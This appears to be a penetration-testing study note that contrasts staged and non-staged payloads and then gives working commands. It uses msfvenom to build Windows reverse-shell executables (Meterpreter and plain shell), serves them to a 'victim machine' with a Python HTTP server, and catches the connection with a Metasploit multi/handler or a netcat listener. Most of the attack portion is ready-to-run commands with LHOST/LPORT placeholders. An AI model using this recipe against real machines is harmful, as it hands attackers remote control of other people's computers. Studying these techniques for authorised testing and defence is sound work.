It is important to note that the type of payload used in an attack will depend on the target and the security measures implemented. In general, Staged payloads are more difficult to detect and are preferred by attackers, while Non-Staged payloads are easier to implement but are also easier to detect.

# Staged

It is a type of payload that is divided into two or more stages. The first stage is a small part of the code that is sent to the target, the purpose of which is to establish a secure connection between the attacker and the target machine. Once the connection is established, the attacker sends the second stage of the payload, which is the actual payload of the attack. This approach allows attackers to circumvent additional security measures, as the actual payload is not sent until a secure connection is established.

# Non-Staged

It is a type of payload that is sent as a single entity and is not split into multiple stages. The entire payload is sent to the target in a single packet and is executed immediately upon receipt. This approach is simpler than Payload Staged, but it is also easier to detect by security systems, since all the malicious code is sent at once.

# Example

In this examples we are going to use *msfvenom* to create a malicious .exe file for Windows that allows us to connect through a Reverse Shell trough [[Metasploit]].

## msfvenom

### Staged Payload

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST={LHOST} LPORT={LPORT} -f exe -o test.exe
```

### Non Staged Payload

```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST={LHOST} LPORT={LPORT} -f exe -o test.exe
```

----
> Both options will generate an .exe that, for learning purposes, we can share with the victim machine via *Python* with a http server: **python3 -m http.server {LPORT}**
----

## Metasploit

After genereting the .exe file, we can start running metasploit:

```shell
# Is a good practice update db every single time we start msfconsole
msfdb run

use exploit/multi/handler

# windows/x64/meterpreter/reverse_tcp in case of staged or windows/x64/meterpreter_reverse_tcp in case of non-staged
set payload {PAYLOAD}

set LHOST {LHOST}

set LPORT {LPORT}

run
```

After that, we should be able to entablish a tcp connection when the victim runs the .exe file.

----
> Refer to [[Metasploit]] for more information about post-exploitation
----

## Netcat

```shell
# First we generate the .exe file
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST={LHOST} LPORT={LPORT} -f exe -o test.exe

# And then we listen in the specified port
nc -nlvp {LPORT}
```

We can also give extra functionalities in Windows shells with the auxiliary tool *rlwrap*, that give us some features like CTRL+L or get previous command (up arrow) in the reverse shell:

```shell
apt install rlwrap

rlwrap nc -nlvp 1234
```